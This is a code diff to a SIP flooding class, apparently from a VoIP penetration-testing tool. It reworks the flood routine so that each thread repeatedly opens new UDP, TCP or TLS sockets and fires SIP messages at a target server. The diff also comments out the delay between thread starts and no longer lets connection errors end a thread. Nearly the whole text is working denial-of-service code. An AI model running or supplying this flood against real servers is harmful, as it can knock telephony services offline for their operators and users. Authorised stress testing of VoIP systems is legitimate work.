@@ -115,14 +115,13 @@ class SipFlood:
                 t = threading.Thread(target=self.flood, daemon=True)
                 threads.append(t)
                 t.start()
-                time.sleep(0.1)
-
-        if self.run == False and (self.count >= self.number or self.number == 0):
-            print(self.c.BYELLOW + '\n\n[-] Closing threads ...' + self.c.WHITE)
+                # time.sleep(0.1)
 
         for i, t in enumerate(threads):
+            print(self.c.BYELLOW + '\n[!] Thread %d closed ...' % (i+1) + self.c.WHITE, end="\r")
             t.join()
  
+        print(self.c.BYELLOW + '\n[+] Sent ' + self.c.BGREEN + '%d' % self.count + self.c.YELLOW + ' messages' + self.c.WHITE)
         print(self.c.WHITE)
 
     def signal_handler(self, sig, frame):
@@ -136,59 +135,56 @@ class SipFlood:
         self.run = False
 
     def flood(self):
-        try:
-            if self.proto == 'UDP':
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            else:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        except socket.error:
-            print(self.c.RED + 'Failed to create socket')
-            sys.exit(1)
-        fcntl.fcntl(sock, fcntl.F_SETFL, os.O_NONBLOCK)
+        while self.run == True and (self.count <= self.number or self.number == 0):
+            try:
+                if self.proto == 'UDP':
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                else:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            except socket.error:
+                print(self.c.RED + 'Failed to create socket')
+                sys.exit(1)
+            fcntl.fcntl(sock, fcntl.F_SETFL, os.O_NONBLOCK)
 
-        bind = '0.0.0.0'
-        lport = get_free_port()
-
-        try:
-            lport = get_free_port()
-            sock.bind((bind, lport))
-
+            bind = '0.0.0.0'
             host = (str(self.ip), int(self.rport))
 
-            if self.bad == None:
-                if self.host != '' and self.domain == '':
-                    self.domain = self.host
-                if self.domain == '':
-                    self.domain = self.ip
-                if not self.from_domain or self.from_domain == '':
-                    self.from_domain = self.domain
-                if not self.to_domain or self.to_domain == '':
-                    self.to_domain = self.domain
-
-                if self.contact_domain == '':
-                    self.contact_domain = '10.0.0.1'
-
-                msg = create_message(self.method, self.contact_domain, self.from_user, self.from_name, self.from_domain,
-                                    self.to_user, self.to_name, self.to_domain, self.proto, self.domain, self.user_agent, lport, '', '', '', '1', '', self.digest, 1, '', 0, '', '')
-
-                method_label = self.method
-
             try:
-                sock.settimeout(1)
+                lport = get_free_port()
+                sock.bind((bind, lport))
 
-                if self.proto == 'TCP':
-                    sock.connect(host)
+                if self.bad == None:
+                    if self.host != '' and self.domain == '':
+                        self.domain = self.host
+                    if self.domain == '':
+                        self.domain = self.ip
+                    if not self.from_domain or self.from_domain == '':
+                        self.from_domain = self.domain
+                    if not self.to_domain or self.to_domain == '':
+                        self.to_domain = self.domain
 
-                if self.proto == 'TLS':
-                    sock_ssl = ssl.wrap_socket(
-                        sock, ssl_version=ssl.PROTOCOL_TLS, ciphers=None, cert_reqs=ssl.CERT_NONE)
-                    sock_ssl.connect(host)
-            except:
-                # print(self.c.RED + '\nSocket connection error\n' + self.c.WHITE)
-                sock.close()
-                return
+                    if self.contact_domain == '':
+                        self.contact_domain = '10.0.0.1'
 
-            while self.run == True and (self.count <= self.number or self.number == 0):
+                    msg = create_message(self.method, self.contact_domain, self.from_user, self.from_name, self.from_domain,
+                                        self.to_user, self.to_name, self.to_domain, self.proto, self.domain, self.user_agent, lport, '', '', '', '1', '', self.digest, 1, '', 0, '', '')
+
+                    method_label = self.method
+
+                try:
+                    sock.settimeout(1)
+
+                    if self.proto == 'TCP':
+                        sock.connect(host)
+
+                    if self.proto == 'TLS':
+                        sock_ssl = ssl.wrap_socket(
+                            sock, ssl_version=ssl.PROTOCOL_TLS, ciphers=None, cert_reqs=ssl.CERT_NONE)
+                        sock_ssl.connect(host)
+                except:
+                    # print(self.c.RED + '\nSocket connection error\n' + self.c.WHITE)
+                    pass
+
                 try:
                     if self.bad == 1:
                         if not self.method or self.method == '':
@@ -242,10 +238,11 @@ class SipFlood:
                 except socket.timeout:
                     pass
                 except:
-                    sock.close()
-                    return
-        except:
-            pass
-    
+                    pass
+            except:
+                pass
+
+            sock.close()
+
         sock.close()
         return
